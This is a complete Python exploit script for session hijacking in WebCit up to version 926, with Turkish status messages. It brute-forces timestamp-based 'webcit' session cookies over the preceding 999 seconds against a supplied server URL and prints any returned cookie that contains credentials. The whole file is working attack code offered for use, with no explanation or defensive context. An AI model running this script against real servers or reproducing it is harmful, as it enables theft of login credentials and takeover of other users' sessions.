import argparse
import requests
import time
import colorama
from colorama import Fore
import sys
colorama.init()
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


parser = argparse.ArgumentParser(description="Webcit <= 926 Session Hijacking")
parser.add_argument('--url', action='store', dest='url', required=True, help="Full URL and port e.g.: http://192.168.1.111:8080/")
parser.add_argument('--verbose', '-v', action='store_true', required=False, help="Shows the full response")
args = parser.parse_args()

url = args.url
verbose = args.verbose


def check_endpoint(url):
	headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}
	response = requests.get(url+'/dotskip?room=_BASEROOM_', headers=headers, verify=False)
	if response.status_code == 200:
		print(Fore.YELLOW+"[+]"+Fore.RESET+" Webcit ulaşılabilir\n")
	else:
		print(Fore.RED+"\n[-]"+Fore.RESET+" Webcit Yanıt Kodu:", response.status_code)
		sys.exit()
		
def harvesting(url, verbose):
	epoch_time = int(time.time())
	search_back_in = 999
	print(Fore.CYAN+"[/]"+Fore.RESET+" Devam eden kimlik bilgisi hasatlanıyor...")
	while search_back_in > 0:
		payload = str(epoch_time-search_back_in)+'|||||'
		payload_hex = payload.encode(encoding='utf_8').hex()
		headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','Cookie':'webcit='+payload_hex+''}
		response = requests.get(url+'/dotskip?room=_BASEROOM_', headers=headers, verify=False)
		try:
			cookievalue = bytes.fromhex(response.cookies['webcit'])
			cookievalue = cookievalue.decode(encoding='utf_8')
			parts = cookievalue.split('|')
			
			if ((len(parts[1])) and (len(parts[2]))):
				print(Fore.BLUE+"[*]"+Fore.RESET+" Kimlik Bilgisi Bulundu:", cookievalue)
			
		except:
			if(verbose):
				print(Fore.RED+"[-]"+Fore.RESET+" Döndürülen çerez değeri geçerli değil, atlama")
		search_back_in = search_back_in - 1
	print(Fore.YELLOW+"[+]"+Fore.RESET+" Kimlik Bilgisi Hasat tamamlandı.")

check_endpoint(url)
harvesting(url, verbose)